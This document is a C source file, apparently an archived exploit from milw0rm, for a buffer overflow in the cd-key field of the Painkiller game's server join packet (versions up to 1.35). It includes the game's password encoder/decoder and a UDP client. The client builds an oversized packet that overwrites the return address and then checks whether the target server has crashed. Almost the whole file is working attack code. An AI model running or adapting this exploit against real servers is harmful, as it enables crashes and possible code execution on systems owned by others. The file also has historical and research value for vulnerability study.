@@ -1,0 +1,530 @@
+/*
+
+by Luigi Auriemma
+
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <time.h>
+/*
+
+Painkiller packet's password encoder/decoder 0.1
+by Luigi Auriemma
+e-mail: aluigi@autistici.org
+web:    http://aluigi.altervista.org
+
+
+INTRODUCTION
+============
+When you want to join a password protected game server of Painkiller
+(http://www.painkillergame.com) your client sends a packet containing
+the packet ID (0x04), your client version, the 72 bytes of the Gamespy
+auth key (http://aluigi.altervista.org/papers/gskey-auth.txt) plus a
+"strange" text string after it.
+This text string is just the password you have used to join and it is
+encrypted using the other text string (the server challenge) sent by
+the server in its previous packet.
+My optimized algorithm is able to decode/encode the password stored in
+the packet sent by the client.
+
+
+HOW TO USE
+==========
+The function is an algorithm used for both encoding and decoding
+without differences.
+It needs only 2 parameters:
+- pwd: the client's password stored in the packet
+- enc: the server challenge string
+
+Example:
+  #include "painkiller_pckpwd.h"
+
+    unsigned char   pwd[] = "5mjblOpV8N",
+                    enc[] = "k7bEv4cGcw";
+    painkiller_pckpwd(pwd, enc);
+    printf("Password: %s\n", pwd);  // the password is "mypassword"
+
+
+LICENSE
+=======
+    Copyright 2004 Luigi Auriemma
+
+    This program is free software; you can redistribute it and/or modify
+    it under the terms of the GNU General Public License as published by
+    the Free Software Foundation; either version 2 of the License, or
+    (at your option) any later version.
+
+    This program is distributed in the hope that it will be useful,
+    but WITHOUT ANY WARRANTY; without even the implied warranty of
+    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+    GNU General Public License for more details.
+
+    You should have received a copy of the GNU General Public License
+    along with this program; if not, write to the Free Software
+    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307 USA
+
+    http://www.gnu.org/licenses/gpl.txt
+
+*/
+
+/* Inserted painkiller_pckpwd.h, winerr.h /str0ke */
+
+void painkiller_pckpwd(unsigned char *pwd, unsigned char *enc) {
+    unsigned char   buff[64],
+                    encbuff[64],
+                    *p1,
+                    *p2;
+    int             len,
+                    i,
+                    cl,
+                    dl,
+                    esi,
+                    edi;
+
+    p1 = pwd;
+    while(1) {
+        if((*p1 >= '0') && (*p1 <= '9')) {
+            *p1 -= 0x30;
+        } else if((*p1 >= 'a') && (*p1 <= 'z')) {
+            *p1 -= 0x57;
+        } else if((*p1 >= 'A') && (*p1 <= '\\')) {
+            *p1 -= 0x1d;
+        } else {
+            break;
+        }
+        p1++;
+    }
+    len = p1 - pwd;
+
+    p1 = buff;
+    for(i = 0; i < 64; i++) {
+        *p1++ = i;
+    }
+
+    p1 = enc;
+    p2 = encbuff;
+    for(i = 0; i < 64; i++) {
+        *p2++ = *p1++;
+        if(!*p1) p1 = enc;
+    }
+
+    p1 = buff;
+    p2 = encbuff;
+    for(i = esi = 0; i < 64; i++) {
+        cl = *p1;
+        esi = (*p2 + cl + esi) & 63;
+        *p1++ = buff[esi];
+        buff[esi] = cl;
+        p2++;
+    }
+
+    esi = edi = 0;
+    p1 = pwd;
+    for(i = 0; i < len; i++) {
+        esi = (esi + 1) & 63;
+        cl = buff[esi];
+        edi = (cl + edi) & 63;
+        dl = buff[edi];
+        buff[esi] = dl;
+        buff[edi] = cl;
+        *p1++ ^= buff[(dl + cl) & 63];
+    }
+
+    p1 = pwd;
+    while(len--) {
+        if(*p1 <= 9) {
+            *p1 += 0x30;
+        } else if((*p1 >= 0xa) && (*p1 <= 0x23)) {
+            *p1 += 0x57;
+        } else {
+            *p1 += 0x1d;
+        }
+        p1++;
+    }
+}
+
+
+#ifdef WIN32
+    #include <winsock.h>
+/*
+   Header file used for manage errors in Windows
+   It support socket and errno too
+   (this header replace the previous sock_errX.h)
+*/
+
+#include <string.h>
+#include <errno.h>
+
+
+
+void std_err(void) {
+    char    *error;
+
+    switch(WSAGetLastError()) {
+        case 10004: error = "Interrupted system call"; break;
+        case 10009: error = "Bad file number"; break;
+        case 10013: error = "Permission denied"; break;
+        case 10014: error = "Bad address"; break;
+        case 10022: error = "Invalid argument (not bind)"; break;
+        case 10024: error = "Too many open files"; break;
+        case 10035: error = "Operation would block"; break;
+        case 10036: error = "Operation now in progress"; break;
+        case 10037: error = "Operation already in progress"; break;
+        case 10038: error = "Socket operation on non-socket"; break;
+        case 10039: error = "Destination address required"; break;
+        case 10040: error = "Message too long"; break;
+        case 10041: error = "Protocol wrong type for socket"; break;
+        case 10042: error = "Bad protocol option"; break;
+        case 10043: error = "Protocol not supported"; break;
+        case 10044: error = "Socket type not supported"; break;
+        case 10045: error = "Operation not supported on socket"; break;
+        case 10046: error = "Protocol family not supported"; break;
+        case 10047: error = "Address family not supported by protocol family"; break;
+        case 10048: error = "Address already in use"; break;
+        case 10049: error = "Can't assign requested address"; break;
+        case 10050: error = "Network is down"; break;
+        case 10051: error = "Network is unreachable"; break;
+        case 10052: error = "Net dropped connection or reset"; break;
+        case 10053: error = "Software caused connection abort"; break;
+        case 10054: error = "Connection reset by peer"; break;
+        case 10055: error = "No buffer space available"; break;
+        case 10056: error = "Socket is already connected"; break;
+        case 10057: error = "Socket is not connected"; break;
+        case 10058: error = "Can't send after socket shutdown"; break;
+        case 10059: error = "Too many references, can't splice"; break;
+        case 10060: error = "Connection timed out"; break;
+        case 10061: error = "Connection refused"; break;
+        case 10062: error = "Too many levels of symbolic links"; break;
+        case 10063: error = "File name too long"; break;
+        case 10064: error = "Host is down"; break;
+        case 10065: error = "No Route to Host"; break;
+        case 10066: error = "Directory not empty"; break;
+        case 10067: error = "Too many processes"; break;
+        case 10068: error = "Too many users"; break;
+        case 10069: error = "Disc Quota Exceeded"; break;
+        case 10070: error = "Stale NFS file handle"; break;
+        case 10091: error = "Network SubSystem is unavailable"; break;
+        case 10092: error = "WINSOCK DLL Version out of range"; break;
+        case 10093: error = "Successful WSASTARTUP not yet performed"; break;
+        case 10071: error = "Too many levels of remote in path"; break;
+        case 11001: error = "Host not found"; break;
+        case 11002: error = "Non-Authoritative Host not found"; break;
+        case 11003: error = "Non-Recoverable errors: FORMERR, REFUSED, NOTIMP"; break;
+        case 11004: error = "Valid name, no data record of requested type"; break;
+        default: error = strerror(errno); break;
+    }
+    fprintf(stderr, "\nError: %s\n", error);
+    exit(1);
+}
+
+    #define close   closesocket
+#else
+    #include <unistd.h>
+    #include <sys/socket.h>
+    #include <sys/types.h>
+    #include <arpa/inet.h>
+    #include <netinet/in.h>
+    #include <netdb.h>
+#endif
+
+
+
+#define VER         "0.1"
+#define BUFFSZ      8192
+#define PORT        3455
+#define TIMEOUT     3
+#define CONN        "\xff\xff\xff\xff\x02"
+#define JOIN1       "\xff\xff\xff\xff\x04"
+#define EIP         "AAAA"      /* alpha-numeric only! (1 - 9, A - Z and a - z) */
+
+#define SEND(x,y)   if(sendto(sd, x, y, 0, (struct sockaddr *)&peer, sizeof(peer)) \
+                      < 0) std_err();
+#define REALRECV    len = recvfrom(sd, buff, BUFFSZ, 0, NULL, NULL); \
+                    if(len < 0) std_err(); \
+                    buff[len] = 0x00;
+#define RECV        if(timeout(sd) < 0) { \
+                        fputs("\nError: socket timeout, no reply received\n", stdout); \
+                        exit(1); \
+                    } \
+                    REALRECV;
+
+
+
+u_char *show_info(u_char *buff, int len);
+int timeout(int sock);
+u_long resolv(char *host);
+void std_err(void);
+
+
+
+int main(int argc, char *argv[]) {
+    struct  sockaddr_in peer;
+    int     sd,
+            len,
+            verlen = 0,
+            j,
+            join2len;
+    u_short port = PORT;
+    u_char  buff[BUFFSZ + 1],
+            password[32],
+            server_chall[32],
+            *p,
+            *gamever = NULL,
+            info[] =
+                "\xfe\xfd\x00" "\x00\x00\x00\x00" "\xff\x00\x00",
+            bof[] =
+                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+                EIP,
+            *join2[] = {
+                "122.304",  /* 0 = 1.6 */
+                "105.263",  /* 1 = 1.3 */
+                "105.262",  /* 2 = 1.2 */
+                "101.258",  /* 3 = 1.1 */
+                NULL
+            };
+
+
+    setbuf(stdout, NULL);
+
+    fputs("\n"
+        "Painkiller <= 1.35 in-game cd-key alpha-numeric buffer-overflow "VER"\n"
+        "by Luigi Auriemma\n"
+        "e-mail: aluigi@autistici.org\n"
+        "web:    http://aluigi.altervista.org\n"
+        "\n", stdout);
+
+    if(argc < 2) {
+        printf("\n"
+            "Usage: %s <host> [port(%d)]\n"
+            "\n"
+            " Return address will be overwritten with 0x%08lx.\n"
+            " Only alpha-numeric return addresses are allowed\n"
+            "\n", argv[0], port, *(u_long *)EIP);
+        exit(1);
+    }
+
+#ifdef WIN32
+    WSADATA    wsadata;
+    WSAStartup(MAKEWORD(1,0), &wsadata);
+#endif
+
+    if(argc > 2) port = atoi(argv[2]);
+
+    peer.sin_addr.s_addr  = resolv(argv[1]);
+    peer.sin_port         = htons(port);
+    peer.sin_family       = AF_INET;
+
+    printf("- target   %s : %hu\n",
+        inet_ntoa(peer.sin_addr), port);
+
+    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+    if(sd < 0) std_err();
+    fputs("- request informations:\n", stdout);
+    *(u_long *)(info + 3) = ~time(NULL);
+    SEND(info, sizeof(info) - 1);
+    RECV;
+    close(sd);
+
+    gamever = show_info(buff, len);
+    if(!gamever) {
+        fputs("\nError: no game version in the information reply\n\n", stdout);
+        exit(1);
+    }
+    verlen = strlen(gamever) + 1;
+
+    *password = 0x00;
+
+    j = 0;
+    join2len = strlen(join2[j]) + 1;
+    printf("- try client script version %s\n", join2[j]);
+
+    for(;;) {   /* for passwords only */
+        sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+        if(sd < 0) std_err();
+
+        fputs("\n- send connection request packet\n", stdout);
+        SEND(CONN, sizeof(CONN) - 1);
+        RECV;
+
+        strncpy(server_chall, buff + 5, sizeof(server_chall) - 1);
+        server_chall[sizeof(server_chall) - 1] = 0x00;
+        printf("- server challenge: %s\n", server_chall);
+
+        p = (u_char *)memcpy(buff, JOIN1, sizeof(JOIN1) - 1) +
+            sizeof(JOIN1) - 1;
+        p = (u_char *)memcpy(p, gamever, verlen) +
+            verlen;
+        p = (u_char *)memcpy(p, join2[j], join2len) +
+            join2len;
+
+        p = (u_char *)memcpy(p, bof, sizeof(bof)) + /* Gamespy cd-key       */
+            sizeof(bof);                            /* plus buffer-overflow */
+
+        if(!j) {                                    /* new 1.6 protocol */
+            *p++ = 0x00;
+        } else {                                    /* old protocol */
+            *(u_long *)p = 0x00000000;
+            p += 4;
+        }
+
+        len = strlen(password) + 1;
+        memcpy(p, password, len);
+        painkiller_pckpwd(p, server_chall);
+        p += len;
+
+        if(!j) *p++ = 0x01;                     /* new 1.6 protocol */
+
+        *(u_long *)p = time(NULL);
+        p += 4;
+
+        printf("- send the buffer-overflow packet (EIP = 0x%08lx)\n", *(u_long *)EIP);
+        SEND(buff, p - buff);
+
+        fputs("- wait some seconds...\n", stdout);
+        if(timeout(sd) < 0) break;
+        REALRECV;
+
+        if(!buff[4]) {
+            if(buff[5] == 1) {
+                free(gamever);
+                gamever = strdup(buff + 6);
+                verlen = strlen(gamever) + 1;
+                printf("\n- force game version to %s\n", gamever);
+                if(buff[6 + verlen] == '?') {
+                    if(!join2[++j]) {
+                        fputs("\nError: this server uses an unknown client script version\n\n", stdout);
+                        exit(1);
+                    }
+                    join2len = strlen(join2[j]) + 1;
+                    printf("\n- try client script version %s\n", join2[j]);
+                }
+                close(sd);
+                continue;
+
+            } else if(buff[5] == 2) {
+                if(!join2[++j]) {
+                    fputs("\nError: this server uses an unknown client script version\n\n", stdout);
+                    exit(1);
+                }
+                join2len = strlen(join2[j]) + 1;
+                printf("\n- try client script version %s\n", join2[j]);
+                close(sd);
+                continue;
+
+            } else if(buff[5] == 3) {
+                fputs("- server is protected by password, insert it:\n  ", stdout);
+                fflush(stdin);
+                fgets(password, sizeof(password) - 1, stdin);
+                password[strlen(password) - 1] = 0x00;
+                close(sd);
+                continue;
+
+            } else if(buff[5] == 13) {
+                fputs("\n"
+                    "- the server is NOT vulnerable, it has replied with the error 13:\n"
+                    "  Challenge response too long!\n", stdout);
+                break;
+            }
+            printf("\nError: %s\n", buff + 6);
+            exit(1);
+        }
+
+        fputs("- seems the server is not vulnerable since it is not crashed yet\n", stdout);
+        break;
+    }
+
+    fputs("\n- check server:\n", stdout);
+    SEND(info, sizeof(info) - 1);
+    if(timeout(sd) < 0) {
+        fputs("\nServer IS vulnerable!!!\n\n", stdout);
+    } else {
+        fputs("\nServer doesn't seem vulnerable\n\n", stdout);
+    }
+    close(sd);    
+
+    return(0);
+}
+
+
+
+u_char *show_info(u_char *buff, int len) {
+    u_char  *p1,
+            *p2,
+            *limit,
+            *ver = NULL;
+    int     nt = 0,
+            doit = 0;
+
+    limit = buff + len;
+    p1 = buff + 5;
+    while(p1 < limit) {
+        p2 = strchr(p1, 0x00);
+        if(!p2) break;
+        *p2 = 0x00;
+
+        if(!nt) {
+            if(!*p1) break;
+            if(!strcmp(p1, "gamever")) doit = 1;
+            printf("%30s: ", p1);
+            nt++;
+        } else {
+            if(doit) {
+                ver = strdup(p1);
+                doit = 0;
+            }
+            printf("%s\n", p1);
+            nt = 0;
+        }
+        p1 = p2 + 1;
+    }
+    fputc('\n', stdout);
+    return(ver);
+}
+
+
+
+int timeout(int sock) {
+    struct  timeval tout;
+    fd_set  fd_read;
+    int     err;
+
+    tout.tv_sec = TIMEOUT;
+    tout.tv_usec = 0;
+    FD_ZERO(&fd_read);
+    FD_SET(sock, &fd_read);
+    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
+    if(err < 0) std_err();
+    if(!err) return(-1);
+    return(0);
+}
+
+
+
+u_long resolv(char *host) {
+    struct hostent *hp;
+    u_long host_ip;
+
+    host_ip = inet_addr(host);
+    if(host_ip == INADDR_NONE) {
+        hp = gethostbyname(host);
+        if(!hp) {
+            printf("\nError: Unable to resolv hostname (%s)\n", host);
+            exit(1);
+        } else host_ip = *(u_long *)hp->h_addr;
+    }
+    return(host_ip);
+}
+
+
+
+#ifndef WIN32
+    void std_err(void) {
+        perror("\nError");
+        exit(1);
+    }
+#endif
+
+// milw0rm.com [2005-02-02]
